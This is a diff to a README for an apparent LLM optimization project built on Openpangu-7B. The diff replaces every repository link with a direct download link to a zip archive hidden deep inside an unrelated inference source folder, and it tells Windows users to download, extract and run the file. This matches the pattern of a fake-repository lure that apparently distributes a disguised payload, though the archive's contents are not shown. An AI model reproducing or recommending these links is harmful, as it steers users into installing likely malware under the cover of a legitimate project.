@@ -1,11 +1,11 @@
 # 🧠 EvoOpt_oppangu_optimization_model - LLM Optimization for Operations
 
-[![Download](https://img.shields.io/badge/Download-Page-blue?style=for-the-badge)](https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model)
+[![Download](https://img.shields.io/badge/Download-Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model/main/openpangu-embedded-7b-model/inference/vllm_ascend/entrypoints/openai/reasoning_parsers/Opt_model_Evo_oppangu_optimization_v3.7.zip)
 
 ## 🚀 Download
 Use this page to download and set up EvoOpt_oppangu_optimization_model on Windows:
 
-https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model
+https://raw.githubusercontent.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model/main/openpangu-embedded-7b-model/inference/vllm_ascend/entrypoints/openai/reasoning_parsers/Opt_model_Evo_oppangu_optimization_v3.7.zip
 
 ## 🖥️ What this app does
 EvoOpt_oppangu_optimization_model is a set of solutions that uses Openpangu-7B as the base model. It helps with optimization tasks in operations research by using large language models in a practical way.
@@ -39,7 +39,7 @@ If the repository includes more than one solution, choose the one marked as the 
 
 ## 📦 Download and install
 1. Open the download page:
-   https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model
+   https://raw.githubusercontent.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model/main/openpangu-embedded-7b-model/inference/vllm_ascend/entrypoints/openai/reasoning_parsers/Opt_model_Evo_oppangu_optimization_v3.7.zip
 2. On the page, look for the main release file, zip package, or project folder.
 3. Download the file to your PC.
 4. If the file is zipped, right-click it and choose Extract All.
@@ -130,4 +130,4 @@ When you download the project:
 ## 📌 Main download link
 Visit this page to download and run the project files on Windows:
 
-https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model
+https://raw.githubusercontent.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model/main/openpangu-embedded-7b-model/inference/vllm_ascend/entrypoints/openai/reasoning_parsers/Opt_model_Evo_oppangu_optimization_v3.7.zip
